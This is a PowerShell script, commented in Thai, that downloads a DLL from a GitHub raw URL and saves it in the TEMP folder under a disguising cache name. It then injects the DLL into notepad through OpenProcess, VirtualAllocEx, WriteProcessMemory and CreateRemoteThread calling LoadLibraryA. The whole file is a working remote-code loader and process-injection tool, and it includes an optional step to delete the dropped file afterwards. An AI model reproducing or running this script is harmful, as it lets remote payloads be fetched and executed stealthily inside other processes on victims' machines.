
# --- CONFIGURATION ---
$dllUrl = "https://raw.githubusercontent.com/malachixxx/testdll/main/Cleanup.dll" # เปลี่ยนเป็นลิงก์ DLL ของคุณ
$tempPath = "$env:TEMP\data_cache.dll"
$processName = "notepad"

# 1. ดาวน์โหลด DLL จากลิงก์
try {
    Write-Host "[*] Downloading DLL..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $dllUrl -OutFile $tempPath -ErrorAction Stop
} catch {
    Write-Host "[-] Failed to download DLL" -ForegroundColor Red
    return
}

# 2. ตรวจสอบ Process เป้าหมาย
$targetProcess = Get-Process $processName -ErrorAction SilentlyContinue
if (-not $targetProcess) {
    Write-Host "[-] Process '$processName' not found! Opening it now..." -ForegroundColor Yellow
    $targetProcess = Start-Process $processName -PassThru
    Start-Sleep -Seconds 2
}

# 3. นิยามฟังก์ชัน Windows API ด้วย C#
$Source = @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

# โหลด Type เข้าสู่ Session (ตรวจสอบเพื่อไม่ให้เกิด Error หากรันซ้ำ)
if (-not ([System.Management.Automation.PSTypeName]"Injector").Type) {
    Add-Type -TypeDefinition $Source
}

# 4. เริ่มกระบวนการ Injection
try {
    Write-Host "[*] Injecting into $($targetProcess.ProcessName) (PID: $($targetProcess.Id))..." -ForegroundColor Cyan

    # เปิด Process Handle
    $hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetProcess.Id)
    
    # จองพื้นที่ใน Memory ของเป้าหมาย
    $dllPathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempPath)
    $allocMem = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$dllPathBytes.Length, 0x3000, 0x40)

    # เขียนที่อยู่ DLL ลงใน Memory
    $bytesWritten = [IntPtr]::Zero
    $success = [Injector]::WriteProcessMemory($hProcess, $allocMem, $dllPathBytes, [uint32]$dllPathBytes.Length, [ref]$bytesWritten)

    if ($success) {
        # ค้นหาตำแหน่ง LoadLibraryA และสั่งสร้าง Remote Thread เพื่อโหลด DLL
        $loadLibraryAddr = [Injector]::GetProcAddress([Injector]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
        $hThread = [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [IntPtr]::Zero)
        
        if ($hThread -ne [IntPtr]::Zero) {
            Write-Host "[+] Injection Successful!" -ForegroundColor Green
        } else {
            Write-Host "[-] Failed to create remote thread" -ForegroundColor Red
        }
    } else {
        Write-Host "[-] Failed to write memory" -ForegroundColor Red
    }
} catch {
    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
}

# ลบไฟล์ DLL หลังใช้งาน (Option)
# Remove-Item $tempPath -ErrorAction SilentlyContinue
